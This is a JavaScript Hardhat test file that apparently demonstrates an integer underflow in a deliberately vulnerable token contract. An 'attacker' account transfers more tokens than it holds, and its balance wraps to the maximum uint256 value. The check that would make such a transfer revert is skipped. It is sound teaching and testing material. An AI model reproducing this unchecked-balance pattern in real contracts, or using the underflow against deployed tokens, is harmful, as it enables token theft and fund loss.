const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Overflow Problem", () => {
  let deployer, attacker, user;

  beforeEach(async () => {
    [deployer, attacker, user] = await ethers.getSigners();
    const SimpleTokenProb = await ethers.getContractFactory(
      "SimpleTokenProb",
      deployer
    );
    this.simpleTokenProb = await SimpleTokenProb.deploy(1000);
  });

  it("should allow a user to transfer amounts smaller than or equal to its balance", async () => {
    await this.simpleTokenProb.transfer(user.address, 1);
    expect(await this.simpleTokenProb.balanceOf(user.address)).to.eq(1);
    expect(await this.simpleTokenProb.balanceOf(deployer.address)).to.eq(
      (await this.simpleTokenProb.totalSupply()) - 1
    );
  });

  it.skip("should revert if the user tries to transfer an amount greater than its balance", async () => {
    await this.simpleTokenProb.transfer(attacker.address, 10);
    await expect(
      this.simpleTokenProb.connect(attacker).transfer(user.address, 11)
    ).to.be.revertedWith("Not Enough Tokens");
  });

  it("should overflow if an attacker transfer an amount greater than its balance", async () => {
    await this.simpleTokenProb.transfer(attacker.address, 10);

    const initialAttackerBalance = await this.simpleTokenProb.balanceOf(
      attacker.address
    );
    console.log(
      `Initial Attacker Balance: ${initialAttackerBalance.toString()} tokens`
    );

    await this.simpleTokenProb.connect(attacker).transfer(user.address, 11);

    const finalAttackerBalance = await this.simpleTokenProb.balanceOf(
      attacker.address
    );
    console.log(
      `Final Attacker Balance: ${finalAttackerBalance.toString()} tokens`
    );

    expect(await this.simpleTokenProb.balanceOf(attacker.address)).to.eq(
      ethers.constants.MaxUint256
    );
  });
});
